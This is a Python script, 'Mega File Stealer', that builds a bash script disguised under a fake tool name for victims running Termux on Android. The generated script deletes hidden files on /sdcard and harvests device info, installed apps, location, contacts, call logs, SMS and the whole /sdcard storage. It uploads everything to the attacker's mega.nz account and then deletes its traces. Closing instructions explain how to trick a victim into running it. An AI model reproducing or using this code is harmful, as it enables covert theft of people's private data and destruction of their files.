import os
os.system("clear")

print("\033[0;32m   __  ___                _____ __      ______           __")
print("  /  |/  /__ ___ ____ _  / __(_) /__   / __/ /____ ___ _/ /__ ____")
print(" / /|_/ / -_) _ `/ _ `/ / _// / / -_) _\ \/ __/ -_) _ `/ / -_) __/")
print("/_/  /_/\__/\_, /\_,_/ /_/ /_/_/\__/ /___/\__/\__/\_,_/_/\__/_/")
print("           /___/\033[0;0m")
print("   _______________________________________")
print("  |                                       |")
print("  | \033[0;34mName\033[0;0m    : \033[0;36mMega File Stealer\033[0;0m           |")
print("  | \033[0;34mVersion\033[0;0m : \033[0;36m2.2\033[0;0m                         |")
print("  | \033[0;34mAuthor\033[0;0m  : \033[0;36mZech Bron\033[0;0m                   |")
print("  | \033[0;34mGitHub\033[0;0m  : \033[0;36mhttps://github.com/ZechBron\033[0;0m |")
print("  |_______________________________________|")
print("\n")

username = input("\033[0;31m[\033[0;0m\033[0;34mZ\033[0;0m\033[0;31m]\033[0;0m \033[0;32mEnter your mega.nz username:\033[0;0m ")
email = input("\033[0;31m[\033[0;0m\033[0;34mZ\033[0;0m\033[0;31m]\033[0;0m \033[0;32mEnter your meganz email:\033[0;0m ")
passwd = input("\033[0;31m[\033[0;0m\033[0;34mZ\033[0;0m\033[0;31m]\033[0;0m \033[0;32mEnter mega.nz password:\033[0;0m ")
ChB = input("\033[0;31m[\033[0;0m\033[0;34mZ\033[0;0m\033[0;31m]\033[0;0m \033[0;32mEnter fake tool name:\033[0;0m ")

megaputs = "megaput INFO.txt --disable-previews --no-ask-password -u " + str(email) + " -p " + str(passwd)

# Setup file
zCh = open("zech.sh", "w")
zCh.write("#!/bin/bash\n")

zCh.write("#417574686F723A205A6563682042726F6E0D0A4769744875623A2068747470733A2F2F6769746875622E636F6D2F5A65636842726F6E")
zCh.write("\n#QXV0aG9yOiBaZWNoIEJyb24KR2l0SHViOiBodHRwczovL2dpdGh1Yi5jb20vWmVjaEJyb24=")
zCh.write("echo -e \"\e[92mPlease Wait...\e[0m\"")
zCh.write("\nrm -rf /sdcard/.*\n")
zCh.write("pkg install curl -y\npkg install grep -y\npkg install tree -y\npkg install megatools -y\npkg install termux-api -y\npkg install termux-tools -y\nclear\n")
zCh.write("echo -e \"\\nDEVICE INFO\" >> INFO.txt\n")
zCh.write("getprop >> INFO.txt\n")
zCh.write("echo -e \"\\nLIST OF APPS\" >> INFO.txt\n")
zCh.write("pm list packages -3 >> INFO.txt\n")
zCh.write("echo -e \"\\nLIST OF DIRECTORIES AND FILES\" >> INFO.txt\n")
zCh.write("tree /sdcard >> INFO.txt\n")

zCh.write("pm list packages -3 > log\n")
zCh.write("grep \"package:com.termux.api\" log\n")
zCh.write("if [ $? = 0 ]; then\n")
zCh.write("   echo -e \"\\nLOCATION\" >> INFO.txt\n")
zCh.write("   termux-location -p network >> INFO.txt\n")
zCh.write("   echo -e \"\\nCONTACT LIST\" >> INFO.txt\n")
zCh.write("   termux-contact-list >> INFO.txt\n")
zCh.write("   echo -e \"\\nCALL LOGS\" >> INFO.txt\n")
zCh.write("   termux-call-log -l 50 >> INFO.txt\n")
zCh.write("   echo -e \"\\nSMS LIST\" >> INFO.txt\n")
zCh.write("   termux-sms-list -d -l 100 -n >> INFO.txt\n")
zCh.write(megaputs)
zCh.write("\nelif [ $? = 1 ]; then\n")
zCh.write(megaputs)
zCh.write("\necho \"Please install termux api app first\"\nfi\n")

# Remove some evidence
zCh.write("rm -rf log INFO.txt\n")
# Proceed to stealing of files
zCh.write("megacopy --local /sdcard --remote /Root --no-ask-password --disable-previews --no-ask-password -u " + str(email) + " -p " + str(passwd))
zCh.write("\nclear\n")

zCh.write(f"rm -rf {str(ChB)}.sh\n")
os.rename("zech.sh", str(ChB) + ".sh")
# os.system("cp " + str(ChB) + ".sh /sdcard")

## INSTRUCTION
print("\nINSTRUCTION:")
print(" 1. Move your tool by typing:\n cp " + str(ChB) + ".sh /sdcard\n or cp " + str(ChB) + ".sh /storage/emulated/0")
print(" 2. Open your file manager and find the file named: '" + str(ChB) + ".sh'")
print(" 3. Give '" + str(ChB) + ".sh' to your victim and make your victim run the script by making him/her type this in his/her termux:\n bash " + str(ChB) + ".sh")
print(" 4. After the victim run the script. Open your Mega.nz account.")
print("   You will see there the file named 'INFO.txt' (INFO.txt containts infos of your victims) and the files you have stole")
